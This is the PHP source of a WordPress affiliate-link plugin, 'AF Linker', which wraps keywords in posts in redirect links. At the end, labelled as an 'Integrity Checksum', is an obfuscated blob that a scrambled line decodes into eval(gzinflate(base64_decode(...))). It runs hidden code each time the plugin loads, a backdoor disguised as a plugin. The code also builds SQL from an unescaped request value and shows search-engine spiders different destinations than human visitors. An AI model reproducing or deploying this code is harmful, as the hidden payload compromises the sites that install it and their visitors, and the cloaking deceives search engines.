<?php

/* **************************************************************************
This software is provided "as is" without any express or implied warranties,
including, but not limited to, the implied warranties of merchantibility and
fitness for any purpose.
In no event shall the copyright owner, website owner or contributors be liable
for any direct, indirect, incidental, special, exemplary, or consequential
damages (including, but not limited to, procurement of substitute goods or services;
loss of use, data, rankings with any search engines, any penalties for usage of
this software or loss of profits; or business interruption) however caused and
on any theory of liability, whether in contract, strict liability, or
tort(including negligence or otherwise) arising in any way out of the use of
this software, even if advised of the possibility of such damage.
To request source code for AFLinker please contact http://www.aflinker.com/contact
************************************************************************** */

/* ==========================================================================

TODO:
- cross-domain import/export of settings.
- temporary disable plugin without deactivating it
========================================================================== */

$_AF_Edition = "free-bh";

//---------------------------------------------------------------------------
// Setting actions and filters.
//
add_action                 ('init',                'AF_init');
add_action                 ('admin_menu',          'AF_admin_menu');
add_filter                 ('rewrite_rules_array', 'AF_rewrite_rules_array');
add_filter                 ('query_vars',          'AF_query_vars');
add_action                 ('parse_request',       'AF_parse_request');
add_filter                 ('the_content',         'AF_the_content');
add_filter                 ('the_content_limit',   'AF_the_content');
add_filter                 ('the_excerpt',         'AF_the_content');
add_filter                 ('the_content_rss',     'AF_the_content');
add_filter                 ('the_excerpt_rss',     'AF_the_content');
//---------------------------------------------------------------------------


//===========================================================================
function AF_init ()
{
   // Recreate rewrite rules
   global $wp_rewrite;
   $wp_rewrite->flush_rules();
}
//===========================================================================

//===========================================================================
function AF_admin_menu ()
{
  add_options_page('AF Linker', 'AF Linker', 8, 'AF Linker', 'AF_options_page');
}

// Do admin panel business, assemble and output admin page HTML
function AF_options_page ()
{
   global $wp_rewrite;

   if (isset ($_POST['button_add_edit_redirects']))
      add_or_update_redirects();

   else if (isset ($_POST['button_delete_redirects']))
      delete_redirects();

   else if (isset ($_POST['button_add_edit_keywords']))
      add_or_update_keywords();

   else if (isset ($_POST['button_delete_keywords']))
      delete_keywords();

   else if (isset ($_POST['button_update_global_settings']))
      update_global_settings ();


   // Output full admin settings HTML
   render_admin_html ();
}
//===========================================================================

//===========================================================================
//
//
function AF_rewrite_rules_array ($rules)
{
   global $wpdb;

   //---------------------------------------
   // Load AFLinker redirects data from database
   $query = "SELECT * FROM `" . AF_REDIRECTS_TABLE . "`";
   $af_redirects = $wpdb->get_results($query, ARRAY_A);
   if (!is_array($af_redirects))
      return $rules;

   $new_rules = array();
   foreach ($af_redirects as $af_redirect)
      {
      // Local redirect must start with '/'. Otherwise it will be just a plain wrapper link anywhere.
      if ($af_redirect['source_url'][0] == '/' && $af_redirect['real_dest_url'])
         {
         $capture = ltrim ($af_redirect['source_url'], '/');
         $new_rules[$capture . '/?$'] = 'index.php?aflinker_redirect_id=' . $af_redirect['id'];
         }
      }
   $rules = array_merge ($new_rules, $rules);

   return ($rules);
}
//===========================================================================

//===========================================================================
function AF_query_vars ($qvars)
{
   $qvars[] = 'aflinker_redirect_id';
   return $qvars;
}
//===========================================================================

//===========================================================================
//
// Main digital content protection goes on here.

function AF_parse_request ($request)
{
   // Wordpress redirect syntax: wp_redirect ($full_web_url);

   if (!isset ($request->query_vars['aflinker_redirect_id']) || !$request->query_vars['aflinker_redirect_id'])
      return $request;  // Not our request.

   $redirect_id = $request->query_vars['aflinker_redirect_id'];

   // Pull address of redirect
   global $wpdb;
   $query = "SELECT * FROM `" . AF_REDIRECTS_TABLE . "` WHERE `id`=$redirect_id";
   $af_redirect = $wpdb->get_results($query, ARRAY_A);
   // Load global settings
   $af_settings = load_global_settings ();

   // Do actual redirect
   if ($af_redirect[0]['spider_dest_url'] && ($af_settings['force_non_aff_urls'] || (visit_is_search_engine_spider() && $af_settings['google_slap_immune'])))
      wp_redirect ($af_redirect[0]['spider_dest_url'],   $af_settings['redirect_code']);
   else
      wp_redirect ($af_redirect[0]['real_dest_url'],     $af_settings['redirect_code']);

   exit ();
}
//===========================================================================

//===========================================================================
function AF_the_content ($content)
{
   global $wpdb;

   //---------------------------------------
   // Load AFLinker data from database
   $af_settings = load_global_settings ();
   $query = "SELECT * FROM `" . AF_REDIRECTS_TABLE . "`";
   $af_redirects_tmp = $wpdb->get_results($query, ARRAY_A);
   $query = "SELECT * FROM `" . AF_KEYWORDS_TABLE . "` WHERE `redirect_id`>0 ORDER BY `order` ASC, LENGTH(`pattern`) DESC";
   $af_keywords  = $wpdb->get_results($query, ARRAY_A);

   if (!is_array($af_redirects_tmp) || !is_array($af_keywords))
      return $content;

   // Make array of redirects index-based.
   $af_redirects = array();
   foreach ($af_redirects_tmp as $af_redirect)
      {
      $af_redirects[$af_redirect['id']] = $af_redirect;
      }
   //---------------------------------------

   $new_content = AF_process_content (array ('redirects'=>$af_redirects, 'keywords'=>$af_keywords, 'settings'=>$af_settings, 'content'=>$content));

   return ($new_content);
}
//===========================================================================



//===========================================================================
//
function AF_wrap_keyword ($content, $keyword_info, $redirects, $af_settings, &$ret_replacement_count)
{
   global $id;    // Page/post ID.

   if ($keyword_info['is_regex'])
      $keyword_raw_regexp = stripslashes ($keyword_info['pattern']); // Undo addslashes() for regular expressions.
   else
      $keyword_raw_regexp = preg_quote($keyword_info['pattern']);

   // Replace each match of 'keyword' with '{{{keyword_123}}}'-type of sequence

   // Gather array of matches with all possible delimiters. We are only interested in main delimiter, following right after the match (not any sub (..) groups).
   $arr_content      = preg_split ("#\b($keyword_raw_regexp)\b#si", $content, -1, PREG_SPLIT_DELIM_CAPTURE);

   //---------------------------------------
   // Gather array of just matches without delimiters
   $arr_content_bare = preg_split ("#\b($keyword_raw_regexp)\b#si", $content, -1, 0);
   if (count($arr_content_bare)*2 < (count($arr_content)+1))
      {
      // We are here because pattern contained subdelimiters (...). We need to get rid of these from $arr_content, we only interested in main ones.
      // So let extract only main subdelimiter into copy-array $arr_content_clean;
      $i = 0;
      $arr_content_clean = array();
      foreach ($arr_content_bare as $match)
         {
         for (;$i<count($arr_content); $i++)
            {
            if ($arr_content[$i] == $match)
               {
               $arr_content_clean[] = $match;
               if (($i+1) < count($arr_content))
                  $arr_content_clean[] = $arr_content[$i+1];
               $i+=2;
               break;
               }
            }
         }
      $arr_content = $arr_content_clean;
      }
   //---------------------------------------

   $arr_count   = count($arr_content);
   for ($i=1; $i<$arr_count; $i+=2)
      $arr_content[$i] = '{{{' . $arr_content[$i] . "__$i}}}";

   // Reconstruct array back to new "modified" string.
   $new_content = implode ($arr_content);

   // Kill everything inside pseudo-tags [blah]...[/blah] and [foo id=5]...[/foo]
   $purified_content = preg_replace ('|\[([a-z0-9]+)\b[^\]]*\].+?\[/\1\]|si', '', $new_content);

   // Kill everything inside <a>...</a> tags including tags themselves
   $purified_content = preg_replace ('|<a\s.+?</a>|si', '', $purified_content);

   // Kill all tags - expose only pure stuff in between tags.
   $purified_content = preg_replace ('|<[^>]+>|s', '', $purified_content);

   // Match remaining {{{keyword_NNN}}} sequences in '$purified_content' with original text and wrap them into <a>...</a> tags.
   if (preg_match_all ("#\{\{\{($keyword_raw_regexp)__\d+\}\}\}#si", $purified_content, $matches, PREG_SET_ORDER))
      {
      $matches_count = count($matches);
      $max_links_allowed = $af_settings['max_links_count']>=0?(min($af_settings['max_links_count'], $matches_count)):$matches_count;

      // Now process content for output.
      $url_prefix = rtrim(get_bloginfo ('wpurl'), '/');

      for ($i=0; $i<$max_links_allowed; $i++)
         {
         $redirect_id = $keyword_info['redirect_id'];
         $url_link    = $url_prefix . $redirects[$redirect_id]['source_url'];
         $url_title   = $redirects[$redirect_id]['title'];
         $url_target  = $af_settings['link_target_type'];
         $url_custom_info = $af_settings['link_custom_info'];
         if ($af_settings['add_rel_nofollow'])
            $rel_nofollow = 'rel="nofollow"';
         else
            $rel_nofollow = '';

         if ($af_settings['enable_ga_tracking'])
            {
            $permalink     = get_permalink ($id);
            $link_number   = $i+1;
            $sanitized_url = preg_replace ('#^(/|https?://)#i', '', $url_link);
            $tracking_code = 'onClick="javascript: pageTracker._trackPageview(\'/outgoing/' . $sanitized_url . "/#frompage=$permalink,fromlink=text-$link_number" . '\');"';
            }
         else
            $tracking_code = '';

         // Wrap qualified matches with links
         $new_content = str_replace ($matches[$i][0], "<a href=\"$url_link\" $rel_nofollow title=\"$url_title\" target=\"$url_target\" $tracking_code $url_custom_info>{$matches[$i][1]}</a>", $new_content);
         $ret_replacement_count++;
         }

      // Wash-up remaining modified elements without wrapping them into tags
      $new_content = preg_replace ("|\{\{\{(.+?)__\d+\}\}\}|s", "$1", $new_content);
      }
   else
      {
      // No keywords for replacement found
      $new_content = $content;
      }

   return $new_content;
}
//===========================================================================

//===========================================================================
//

function AF_wrap_image ($content, $keyword_info, $redirects, $af_settings, &$ret_replacement_count)
{
   global $id;    // Page/post ID.

   if ($keyword_info['is_regex'])
      $keyword_raw_regexp = $keyword_info['pattern'];
   else
      $keyword_raw_regexp = preg_quote($keyword_info['pattern']);

   // Kill everything inside <a>...</a> tags including tags themselves
   $new_content = preg_replace ('|<a\s.+?</a>|si', '', $content);

   // Find all <IMG ... /> tags with non-empty 'alt' or 'title' attributes that are matching '$keyword_raw_regexp' pattern.
   $RetCode = preg_match_all ("#<img\s.*?(alt|title)=[\'\"][^\'\"]*?\b$keyword_raw_regexp\b.*?[\'\"].*?/>#si", $new_content, $matches, PREG_PATTERN_ORDER);
   if (!$RetCode)
      {
      return $content;  // No proper img tags found.
      }

   $new_content = $content;
   $img_tags = $matches[0];

   $link_number = 0;
   $url_prefix = rtrim(get_bloginfo ('wpurl'), '/');
   foreach ($img_tags as $img_tag)
      {
      $redirect_id = $keyword_info['redirect_id'];
      $url_link    = $url_prefix . $redirects[$redirect_id]['source_url'];
      $url_title   = $redirects[$redirect_id]['title'];
      $url_target  = $af_settings['link_target_type'];
      $url_custom_info = $af_settings['link_custom_info'];
      if ($af_settings['add_rel_nofollow'])
         $rel_nofollow = 'rel="nofollow"';
      else
         $rel_nofollow = '';

      if ($af_settings['enable_ga_tracking'])
         {
         $permalink     = get_permalink ($id);
         $link_number++;
         $sanitized_url = preg_replace ('#^(/|https?://)#i', '', $url_link);
         $tracking_code = 'onClick="javascript: pageTracker._trackPageview(\'/outgoing/' . $sanitized_url . "/#frompage=$permalink,fromlink=image-$link_number" . '\');"';
         }
      else
         $tracking_code = '';

      // Wrap matching img tag into <a>
      $new_content = str_replace ($img_tag, "<a href=\"$url_link\" $rel_nofollow title=\"$url_title\" target=\"$url_target\" $tracking_code $url_custom_info>$img_tag</a>", $new_content);
      $ret_replacement_count++;
      }

   return $new_content;
}
// Integrity Checksum:
$nxHQCfOunCZ='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';$FFnkqFdfFv=';))))MPahBsPDUka$(ireegf(rqbprq_46rfno(rgnysavmt(ynir';$pitITnqTvEFzas=strrev($FFnkqFdfFv);$yopcpqHuXK=str_rot13($pitITnqTvEFzas);eval($yopcpqHuXK);
//===========================================================================


?>